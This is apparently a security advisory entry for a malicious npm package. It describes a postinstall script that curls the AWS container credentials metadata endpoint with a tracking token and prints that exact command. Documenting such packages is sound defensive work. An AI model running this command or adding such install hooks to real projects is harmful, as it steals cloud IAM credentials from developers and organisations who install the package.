summary: postinstall exfiltrates AWS container IAM credentials via metadata endpoint probe
details: package.json declares a postinstall lifecycle script that runs `curl http://169.254.170.2/v4/66d9c665c1c54f3a91dcc6e73a917aec-0711026588` on npm install. 169.254.170.2 is the AWS ECS/EKS container credentials metadata endpoint, which returns short-lived IAM role credentials for the task the installer is running in. The unique token embedded in the request path allows the operator of the receiving infrastructure to correlate the callback with the specific install and, in dependency-confusion / SSRF-style flows, harvest the returned credentials. The behavior fires automatically on `npm install` with no relationship to any legitimate build activity.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
